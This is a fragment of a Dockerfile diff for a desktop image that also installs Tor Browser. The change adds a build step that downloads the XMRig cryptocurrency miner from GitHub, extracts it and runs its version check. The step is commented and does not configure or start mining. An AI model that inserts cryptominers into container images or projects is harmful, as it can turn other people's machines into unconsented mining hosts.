@@ -88,6 +88,20 @@ RUN wget -q "https://dist.torproject.org/torbrowser/${TOR_BROWSER_VERSION}/tor-b
     && test -x /home/desktopuser/tor-browser/Browser/start-tor-browser \
     && chown -R desktopuser:desktopuser /home/desktopuser/tor-browser
 
+# Install XMRig during image build.
+# The build must fail if installation, extraction or version check fails.
+RUN cd /home/desktopuser \
+    && apt-get update \
+    && apt-get install -y wget tar \
+    && wget https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-noble-x64.tar.gz \
+    && tar -xzf xmrig-6.26.0-noble-x64.tar.gz \
+    && cd xmrig-6.26.0 \
+    && chmod +x xmrig \
+    && ./xmrig --version \
+    && rm -f ../xmrig-6.26.0-noble-x64.tar.gz \
+    && chown -R desktopuser:desktopuser /home/desktopuser/xmrig-6.26.0 \
+    && rm -rf /var/lib/apt/lists/*
+
 COPY requirements.txt /tmp/requirements.txt
 RUN python3 -m venv /opt/venv \
     && /opt/venv/bin/pip install --no-cache-dir --upgrade pip \
